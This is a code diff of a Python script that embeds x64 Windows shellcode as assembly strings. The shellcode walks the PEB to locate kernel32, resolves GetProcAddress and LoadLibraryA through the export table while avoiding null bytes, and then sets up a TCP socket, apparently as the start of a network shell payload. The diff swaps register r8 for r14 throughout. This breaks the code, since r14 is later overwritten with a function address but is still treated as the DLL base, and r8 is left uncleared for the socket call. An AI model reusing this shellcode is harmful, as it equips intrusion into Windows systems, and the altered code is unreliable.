@@ -30,17 +30,17 @@ def main():
 "   xchg rax, rsi;"                 # Swap RAX,RSI
 "   lodsq;"                         # Load qword at address (R)SI into RAX
 "   mov rbx, [rax + 0x20] ;"        # RBX = Kernel32 base address
-"   mov r8, rbx; "                  # Copy Kernel32 base address to R8 register
+"   mov r14, rbx; "                  # Copy Kernel32 base address to r14 register
 
 # Finding the export address table of kernel32.dll
 "   mov ebx, [rbx+0x3C];"
-"   add rbx, r8;"                   # r8 was the copy of our kernel32.dll base
+"   add rbx, r14;"                   # r14 was the copy of our kernel32.dll base
 "   xor r12, r12; "
 "   add r12, 0x88FFFFF;"            # Avoiding the use of null-bytes in our shellcode
 "   shr r12, 0x14;"                 # Same thing
 "   mov edx, [rbx+r12];"            # This jumps us from NT_HEADERS -> Export Address Table. Its hard to read because we 
                                     # manipulate the previous two instructions to avoid null-bytes. The offset is 0x88
-"   add rdx, r8;"                   # To find the VMA, we do: kernel32.dll + RVA. r8 still holds dllbase and rdx holds the rva of the export table
+"   add rdx, r14;"                   # To find the VMA, we do: kernel32.dll + RVA. r14 still holds dllbase and rdx holds the rva of the export table
                                     # RDX now holds the value of IMAGE_EXPORT_DIRECTORY struct
 
                                     # Its hard to tell, but we just need to read the AddressOfFunctions
@@ -50,7 +50,7 @@ def main():
 "   mov r10d, [rdx+0x14];"          # Offset to number of functions (RVA)
 "   xor r11, r11;"
 "   mov r11d, [rdx+0x20];"          # Offset to AddressOfNames (RVA)
-"   add r11, r8;"                   # Address of names (VMA)
+"   add r11, r14;"                   # Address of names (VMA)
 
 # Now we can begin looping, but we need the value stored in r10 (Number of Functions)
 "   mov rcx, r10;"
@@ -59,7 +59,7 @@ def main():
 "   xor ebx,ebx;"                      
 "   mov ebx, [r11+4+rcx*4];"        # RCX is our counter (Number of Functions). We times it by 4 (since each memory address is offset by 4)
                                     # r11 + 4 because there is no function at 0. 
-"   add rbx, r8;"                   # r8 = DllBase for kernel32.dll, rbx = Function Name VMA (remember we zeroed out ebx)
+"   add rbx, r14;"                   # r14 = DllBase for kernel32.dll, rbx = Function Name VMA (remember we zeroed out ebx)
 "   dec rcx;"                       # Decrement the loop counter (if there are 100 functions, on first loop we now have 99)
 "   mov rax, 0x41636f7250746547;"   # GetProcA (It's shifted to avoid null bytes), change this to what function you want to find
 # "   shr rax, 0x8;"                  # Now we shift it back into place (again, to avoid null bytes), will have to change this as well depending on the funciton youre calling
@@ -71,19 +71,19 @@ def main():
 "   inc rcx;"                       # In the loop we dec rcx, so we have to add 1 back to it
 "   xor r11, r11;"
 "   mov r11d, [rdx+0x24];"          # rdx = Export Address Table (So r11 = RVA of AddressOfNameOrdinals)
-"   add r11, r8;"                   # now r11 holds the VMA of AddressOfNameOrdianls
+"   add r11, r14;"                   # now r11 holds the VMA of AddressOfNameOrdianls
 "   mov r13w, [r11+rcx*2];"         # rcx = The function index number * 2 (remember it was our counter in the loop)
                                     # So, r13 holds AddressOfNameOrdianls, which we pass into AddressOfFunctions to get (and finally) import/use the function
 
 "   xor r11, r11;"                   
 "   mov r11d, [rdx+0x1c];"          # rdx = Export Address Table (So r11 = RVA of AddressOfFunctions)
-"   add r11, r8;"                   # now r11 holds the VMA of AddressOfFunctions
+"   add r11, r14;"                   # now r11 holds the VMA of AddressOfFunctions
 "   mov eax, [r11+4+r13*4]; "         # It reads: (r11 + 4 + (r13 * 4)) for clarity. 
                                     # r13 = Function index number (times by 4)
-"   add rax, r8;"                   # VMA of AddressOfFunctions
+"   add rax, r14;"                   # VMA of AddressOfFunctions
 "   mov r14, rax; "                   # Store a copy of the function we finally found
                                     # From here, we supply the arguments needed to call the function, and then call r14. DONE. 
-"   mov rbx, r8; "
+"   mov rbx, r14; "
 
 
 # Push the string LoadLibraryA onto the stack
@@ -93,7 +93,7 @@ def main():
 "push rcx ;"
 
 "mov rdx, rsp ;"                     # RSP was pointing to our LoadLibraryA string. RDX now holds this value (In order to call GetProcAddress)
-"mov rcx, r8 ;"                      # Putting the base address of kernel32 into rcx (In order to call GetProcAddress)
+"mov rcx, r14 ;"                      # Putting the base address of kernel32 into rcx (In order to call GetProcAddress)
 "sub rsp, 0x30 ;"                    # Make room on stack
 "call r14 ;"                         # Call function
 "add rsp, 0x30 ;"                    # Remove allocated stack space
@@ -168,7 +168,7 @@ def main():
 "mov cl, 2; "                       # AF_INET  
 "xor rdx, rdx; "
 "mov dl, 1; "                       # SOCK_STREAM
-"xor r8, r8; "                      # zero r8 for use. 
+"xor r14, r14; "                      # zero r14 for use. 
 "mov r8b, 6; "                      # IPPROTO_TCP
 "sub rsp, 0x20; "
 "call r10; "                        # Call socket(2, 1, 6)
